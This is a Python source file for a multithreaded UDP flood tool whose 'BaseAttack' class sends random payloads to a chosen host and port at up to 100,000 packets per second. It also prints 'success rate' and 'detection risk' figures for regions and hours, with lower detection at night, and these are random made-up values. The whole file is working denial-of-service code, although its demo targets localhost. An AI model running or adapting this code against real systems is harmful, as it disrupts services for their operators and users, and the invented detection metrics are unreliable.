import os
import time
import socket
import random
import threading
from dataclasses import dataclass
from typing import Dict, Any, Optional

MAX_DURATION_S = 120
MAX_RATE_PPS = 100_000
MAX_THREADS = 64

@dataclass
class AttackResult:
    success: bool
    message: str
    metrics: Dict[str, Any]

@dataclass
class AttackConfig:
    username: str
    target_host: str
    target_port: int
    duration_s: int = 10
    rate_pps: int = 5000
    threads: int = 4
    payload_min: int = 32
    payload_max: int = 256
    attack_type: str = "base_attack"
    gateway_ip: Optional[str] = None
    mfa_mode: str = "password_only"

class BaseAttack:
    def __init__(self, cfg: AttackConfig):
        self.cfg = cfg
        self._stop_event = threading.Event()
        self._packets_sent = 0
        self._bytes_sent = 0
        self._lock = threading.Lock()

    def _validate_config(self):
        """Validate attack configuration parameters"""
        if self.cfg.duration_s <= 0 or self.cfg.duration_s > MAX_DURATION_S:
            raise ValueError(f"Duration must be between 1 and {MAX_DURATION_S} seconds")

        if self.cfg.rate_pps <= 0 or self.cfg.rate_pps > MAX_RATE_PPS:
            raise ValueError(f"Rate must be between 1 and {MAX_RATE_PPS} pps")

        if self.cfg.threads <= 0 or self.cfg.threads > MAX_THREADS:
            raise ValueError(f"Threads must be between 1 and {MAX_THREADS}")

        if self.cfg.payload_min <= 0 or self.cfg.payload_min > self.cfg.payload_max:
            raise ValueError("Invalid payload size range")

        try:
            socket.inet_aton(self.cfg.target_host)
        except socket.error:
            if not self.cfg.target_host.replace('.', '').isalnum():
                raise ValueError(f"Invalid target host: {self.cfg.target_host}")

    def _build_payload(self) -> bytes:
        """Generate random payload data"""
        size = random.randint(
            max(1, self.cfg.payload_min),
            max(self.cfg.payload_min, self.cfg.payload_max)
        )
        return os.urandom(size)

    def _send_once(self, sock: socket.socket, target) -> int:
        """Send single packet and return bytes sent"""
        payload = self._build_payload()
        try:
            return sock.sendto(payload, target)
        except socket.error as e:
            print(f"⚠️  Socket error: {e}")
            return 0

    def _worker(self, rate_per_thread: float, target):
        """Worker thread for sending packets"""
        min_interval = (1.0 / rate_per_thread) if rate_per_thread > 0 else 0.0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            while not self._stop_event.is_set():
                start = time.perf_counter()
                sent = self._send_once(sock, target)

                if sent > 0:
                    with self._lock:
                        self._packets_sent += 1
                        self._bytes_sent += sent

                elapsed = time.perf_counter() - start
                sleep_time = min_interval - elapsed
                if sleep_time > 0:
                    time.sleep(sleep_time)

        except Exception as e:
            print(f"⚠️  Worker thread error: {e}")
        finally:
            sock.close()

    def _calculate_success_metrics(self) -> Dict[str, float]:
        """Calculate success rates based on geographic and time patterns"""
        geo_patterns = self._get_geographic_patterns()
        time_modifiers = self._get_time_modifiers()

        selected_region = random.choice(list(geo_patterns.keys()))
        base_success = geo_patterns[selected_region]["success_rate"]
        base_detection = geo_patterns[selected_region]["detection_risk"]

        success_rate = base_success * time_modifiers["success_rate"]
        detection_risk = base_detection * time_modifiers["detection_risk"]

        success_rate = max(0.1, min(0.9, success_rate))
        detection_risk = max(0.1, min(0.8, detection_risk))

        return {
            "success_rate": round(success_rate, 3),
            "detection_risk": round(detection_risk, 3),
            "simulated_region": selected_region,
            "time_efficiency": round(time_modifiers["success_rate"], 2)
        }

    def run(self) -> AttackResult:
        """Execute the attack and return results"""
        try:
            self._validate_config()
            print(f"🎯 Starting {self.cfg.attack_type} attack on {self.cfg.target_host}:{self.cfg.target_port}")
            print(
                f"⏱️  Duration: {self.cfg.duration_s}s | 📊 Rate: {self.cfg.rate_pps} pps | 🧵 Threads: {self.cfg.threads}")

            target = (self.cfg.target_host, self.cfg.target_port)
            threads = []
            rate_per_thread = self.cfg.rate_pps / float(self.cfg.threads)
            start_ts = time.time()
            end_ts = start_ts + self.cfg.duration_s

            self._packets_sent = 0
            self._bytes_sent = 0
            self._stop_event.clear()

            for i in range(self.cfg.threads):
                t = threading.Thread(
                    target=self._worker,
                    args=(rate_per_thread, target),
                    daemon=True,
                    name=f"AttackWorker-{i}"
                )
                t.start()
                threads.append(t)

            print("⚡ Attack in progress...", end="", flush=True)
            last_update = start_ts
            update_interval = 2.0  # Update progress every 2 seconds

            try:
                while time.time() < end_ts and not self._stop_event.is_set():
                    current_time = time.time()

                    if current_time - last_update >= update_interval:
                        elapsed = current_time - start_ts
                        progress = min(100, (elapsed / self.cfg.duration_s) * 100)
                        print(f"\r⚡ Attack in progress... {progress:.1f}% complete", end="", flush=True)
                        last_update = current_time

                    time.sleep(0.1)

            except KeyboardInterrupt:
                print("\n\n⏹️  Attack interrupted by user")
                return AttackResult(False, "Attack interrupted by user", {})
            finally:
                self._stop_event.set()
                for t in threads:
                    t.join(timeout=5.0)

            duration = max(0.001, time.time() - start_ts)
            actual_rate = self._packets_sent / duration
            achievement_percent = (actual_rate / self.cfg.rate_pps) * 100 if self.cfg.rate_pps > 0 else 0

            success_metrics = self._calculate_success_metrics()

            metrics = {
                "packets_sent": self._packets_sent,
                "bytes_sent": self._bytes_sent,
                "duration_seconds": round(duration, 2),
                "actual_rate_pps": round(actual_rate, 2),
                "threads": self.cfg.threads,
                "rate_pps_target": self.cfg.rate_pps,
                "rate_achievement_percent": round(achievement_percent, 2),
                "attack_type": self.cfg.attack_type,
                "target_host": self.cfg.target_host,
                "target_port": self.cfg.target_port,
                "payload_size_min": self.cfg.payload_min,
                "payload_size_max": self.cfg.payload_max,
                "efficiency_score": round(min(100, achievement_percent), 1),
                **success_metrics
            }

            if achievement_percent >= 80:
                status_msg = f"✅ Attack completed successfully - {achievement_percent:.1f}% of target rate achieved"
            elif achievement_percent >= 50:
                status_msg = f"⚠️  Attack completed partially - {achievement_percent:.1f}% of target rate achieved"
            else:
                status_msg = f"❌ Attack completed with low performance - {achievement_percent:.1f}% of target rate"

            print(f"\r{status_msg}")
            return AttackResult(True, status_msg, metrics)

        except Exception as e:
            error_msg = f"❌ Attack failed: {str(e)}"
            print(error_msg)
            return AttackResult(False, error_msg, {
                "attack_type": self.cfg.attack_type,
                "target_host": self.cfg.target_host,
                "target_port": self.cfg.target_port,
                "error": str(e)
            })

    def stop(self):
        """Stop the attack gracefully"""
        self._stop_event.set()

    @staticmethod
    def _get_geographic_patterns() -> Dict[str, Dict[str, float]]:
        """Return geographic success patterns for simulation"""
        return {
            "US": {"success_rate": 0.25, "detection_risk": 0.3},
            "EU": {"success_rate": 0.20, "detection_risk": 0.4},
            "ASIA": {"success_rate": 0.18, "detection_risk": 0.35},
            "LATAM": {"success_rate": 0.15, "detection_risk": 0.25},
            "ME": {"success_rate": 0.12, "detection_risk": 0.2}
        }

    @staticmethod
    def _get_time_modifiers() -> Dict[str, float]:
        """Return time-based modifiers for attack success"""
        hour = (int(time.time()) % 86400) // 3600

        if 2 <= hour <= 6:
            return {"success_rate": 1.2, "detection_risk": 0.7}
        elif 9 <= hour <= 17:
            return {"success_rate": 1.0, "detection_risk": 1.0}
        else:
            return {"success_rate": 0.8, "detection_risk": 0.9}

    def get_attack_info(self) -> Dict[str, Any]:
        """Return information about the attack configuration"""
        return {
            "attack_type": self.cfg.attack_type,
            "target": f"{self.cfg.target_host}:{self.cfg.target_port}",
            "duration_seconds": self.cfg.duration_s,
            "rate_pps": self.cfg.rate_pps,
            "threads": self.cfg.threads,
            "payload_range": f"{self.cfg.payload_min}-{self.cfg.payload_max} bytes",
            "max_duration": MAX_DURATION_S,
            "max_rate": MAX_RATE_PPS,
            "max_threads": MAX_THREADS
        }

if __name__ == "__main__":
    test_config = AttackConfig(
        username="test_user",
        target_host="127.0.0.1",
        target_port=8080,
        duration_s=5,
        rate_pps=1000,
        threads=2,
        attack_type="test_attack"
    )

    attack = BaseAttack(test_config)
    result = attack.run()

    print(f"\n📊 Attack Results:")
    print(f"Success: {result.success}")
    print(f"Message: {result.message}")
    print(f"Metrics:")
    for key, value in result.metrics.items():
        print(f"  {key}: {value}")
